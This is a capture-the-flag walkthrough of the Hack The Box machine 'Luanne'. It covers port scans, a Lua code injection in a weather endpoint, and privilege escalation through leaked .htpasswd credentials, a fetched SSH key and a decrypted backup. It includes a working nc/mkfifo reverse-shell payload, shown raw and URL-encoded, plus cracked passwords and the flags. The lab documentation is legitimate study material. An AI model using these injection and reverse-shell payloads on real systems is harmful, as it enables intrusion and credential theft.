

HTB: Luanne
============================

> labruhtooryboi | Jan 23, 2021


# 10.10.10.218
# luanne.htb


					# reconnisance

'''
rustscan -a 10.10.10.218
'''
'''
Open 10.10.10.218:22
Open 10.10.10.218:80
Open 10.10.10.218:9001
'''


'''
nmap -Pn -p 80,22,9001 -A -v -oN nmapagress.txt 10.10.10.218
'''
'''
Nmap scan report for 10.10.10.218
Host is up (0.11s latency).

PORT     STATE SERVICE VERSION
22/tcp   open  ssh     OpenSSH 8.0 (NetBSD 20190418-hpn13v14-lpk; protocol 2.0)
| ssh-hostkey: 
|   3072 20:97:7f:6c:4a:6e:5d:20:cf:fd:a3:aa:a9:0d:37:db (RSA)
|   521 35:c3:29:e1:87:70:6d:73:74:b2:a9:a2:04:a9:66:69 (ECDSA)
|_  256 b3:bd:31:6d:cc:22:6b:18:ed:27:66:b4:a7:2a:e4:a5 (ED25519)
80/tcp   open  http    nginx 1.19.0
| http-auth: 
| HTTP/1.1 401 Unauthorized\x0D
|_  Basic realm=.
| http-methods: 
|_  Supported Methods: GET HEAD POST
| http-robots.txt: 1 disallowed entry 
|_/weather
|_http-server-header: nginx/1.19.0
|_http-title: 401 Unauthorized
9001/tcp open  http    Medusa httpd 1.12 (Supervisor process manager)
| http-auth: 
| HTTP/1.1 401 Unauthorized\x0D
|_  Basic realm=default
|_http-server-header: Medusa/1.12
|_http-title: Error response
Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port
Device type: general purpose|WAP|storage-misc
Running (JUST GUESSING): NetBSD 5.X|7.X|3.X|2.X (95%), Apple NetBSD 4.X (94%), Apple embedded (93%), QNX RTOS 6.X (91%)
OS CPE: cpe:/o:netbsd:netbsd:5.1.2 cpe:/o:apple:netbsd cpe:/o:netbsd:netbsd:7.99 cpe:/o:netbsd:netbsd:3.1.1 cpe:/h:apple:airport_extreme cpe:/o:apple:netbsd:4.99 cpe:/o:qnx:rtos:6.5.0 cpe:/o:netbsd:netbsd:2.1.0_stable
Aggressive OS guesses: NetBSD 5.1.2 (95%), NetBSD 5.0 - 5.99.5 (95%), Apple AirPort Extreme WAP (version 7.7.3) or NetBSD 7.99 (94%), Apple AirPort Extreme WAP (version 7.7.3) (93%), NetBSD 7.0 (92%), NetBSD 3.1.1 (92%), Apple AirPort Extreme WAP (NetBSD 4.99) (91%), Apple AirPort Extreme WAP or Time Capsule NAS device (NetBSD 4.99), or QNX RTOS 6.5.0 (91%), NetBSD 2.1.0_STABLE or Ricoh C720S, 1107EX, MP 2550, or MP 7001 printer (91%), QNX RTOS 7.0.0 (91%)
No exact OS matches for host (test conditions non-ideal).
Uptime guess: 0.002 days (since Sat Jan 23 23:50:39 2021)
Network Distance: 2 hops
TCP Sequence Prediction: Difficulty=212 (Good luck!)
IP ID Sequence Generation: All zeros
Service Info: OS: NetBSD; CPE: cpe:/o:netbsd:netbsd

TRACEROUTE (using port 80/tcp)
HOP RTT       ADDRESS
1   117.96 ms 10.10.14.1
2   124.06 ms 10.10.10.218

Read data files from: /usr/bin/../share/nmap
OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
# Nmap done at Sat Jan 23 23:53:42 2021 -- 1 IP address (1 host up) scanned in 192.41 seconds
'''


					# enumeration

http:80
'''
/robots.txt > /weather
/weather > /forecast
'''

'''
http://10.10.10.218/weather/forecast?city=list

0	"London"
1	"Manchester"
2	"Birmingham"
3	"Leeds"
4	"Glasgow"
5	"Southampton"
6	"Liverpool"
7	"Newcastle"
8	"Nottingham"
9	"Sheffield"
10	"Bristol"
11	"Belfast"
12	"Leicester"
'''



					# explpoitation
				

revshell making
'''
');os.execute("rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.10.14.24 4321 >/tmp/f")--


*url encode*
%27%29%3Bos.execute%28%22rm%20%2Ftmp%2Ff%3Bmkfifo%20%2Ftmp%2Ff%3Bcat%20%2Ftmp%2Ff%7C%2Fbin%2Fsh%20-i%202%3E%261%7Cnc%2010.10.14.24%204321%20%3E%2Ftmp%2Ff%22%29--
'''


'''
*start nc listener*
http://10.10.10.218/weather/forecast?city=London%27%29%3Bos.execute%28%22rm%20%2Ftmp%2Ff%3Bmkfifo%20%2Ftmp%2Ff%3Bcat%20%2Ftmp%2Ff%7C%2Fbin%2Fsh%20-i%202%3E%261%7Cnc%2010.10.14.24%204321%20%3E%2Ftmp%2Ff%22%29--
'''




					# privelage escalation


'''
cat .htpasswd

webapi_user:$1$vVoNCsOl$lMtBS6GL2upDbR4Owhzyc0
webapi_user:iamthebest
'''

'''
nestat -ant
3000 - listening
3001 - listening
'''


'''
curl --user webapi_user:iamthebest 127.0.0.1:3001/~r.michaels/id_rsa
'''


*ssh to r.michaels*
'''
~/r.michaels/backups/devel_backup-2020-09-16.tar.gz.enc
'''

*made this into a one-liner bc stuff was being deleted after a certaon time*
'''
netpgp --decrypt devel_backup-2020-09-16.tar.gz.enc --output=/tmp/lol.tar.gz && cd /tmp && gunzip lol.tar.gz && tar -xf lol.tar && cd devel-2020-09-16/
'''

cat www/.htpasswd
'''
webapi_user:$1$6xc7I/LW$WuSQCS6n3yXsjPMSmwHDu.
webapi_user:littlebear
'''

'''
https://unix.stackexchange.com/questions/209633/why-cant-i-use-sudo-on-openbsd
doas su
'''


					# interesting things

>flags
'''
~/r.michaels/user.txt                 
ea5f0ce6a917b0be1eabc7f9218febc0
'''

'''
/root/root.txt
7a9b5c206e8e8ba09bb99bd113675f66
'''

>users
'''
root
r.michaels
'''


>passwds
'''
iamthebest
'''

'''
littlebear
'''

>files and dirs
'''
~/r.michaels/backups/devel_backup-2020-09-16.tar.gz.enc
'''


>root stuff 
'''

/etc/passwd

root:*:0:0:Charlie &:/root:/bin/sh
toor:*:0:0:Bourne-again Superuser:/root:/bin/sh
daemon:*:1:1:The devil himself:/:/sbin/nologin
operator:*:2:5:System &:/usr/guest/operator:/sbin/nologin
bin:*:3:7:Binaries Commands and Source:/:/sbin/nologin
games:*:7:13:& pseudo-user:/usr/games:/sbin/nologin
postfix:*:12:12:& pseudo-user:/var/spool/postfix:/sbin/nologin
named:*:14:14:& pseudo-user:/var/chroot/named:/sbin/nologin
ntpd:*:15:15:& pseudo-user:/var/chroot/ntpd:/sbin/nologin
sshd:*:16:16:& pseudo-user:/var/chroot/sshd:/sbin/nologin
_pflogd:*:18:18:& pseudo-user:/var/chroot/pflogd:/sbin/nologin
_rwhod:*:19:19:& pseudo-user:/var/rwho:/sbin/nologin
_proxy:*:21:21:Proxy Services:/nonexistent:/sbin/nologin
_timedc:*:22:22:& pseudo-user:/nonexistent:/sbin/nologin
_sdpd:*:23:23:& pseudo-user:/nonexistent:/sbin/nologin
_httpd:*:24:24:& pseudo-user:/var/www:/sbin/nologin
_mdnsd:*:25:25:& pseudo-user:/nonexistent:/sbin/nologin
_tests:*:26:26:& pseudo-user:/nonexistent:/sbin/nologin
_tcpdump:*:27:27:& pseudo-user:/var/chroot/tcpdump:/sbin/nologin
_tss:*:28:28:& pseudo-user:/var/tpm:/sbin/nologin
_rtadvd:*:30:30:& pseudo-user:/var/chroot/rtadvd:/sbin/nologin
_unbound:*:32:32:& pseudo-user:/var/chroot/unbound:/sbin/nologin
_nsd:*:33:33:& pseudo-user:/var/chroot/nsd:/sbin/nologin
uucp:*:66:1:UNIX-to-UNIX Copy:/nonexistent:/sbin/nologin
nobody:*:32767:39:Unprivileged user:/nonexistent:/sbin/nologin
r.michaels:*:1000:100::/home/r.michaels:/bin/ksh
nginx:*:1001:1000:NGINX server user:/var/db/nginx:/sbin/nologin
dbus:*:1002:1001:System message bus:/var/run/dbus:/sbin/nologin
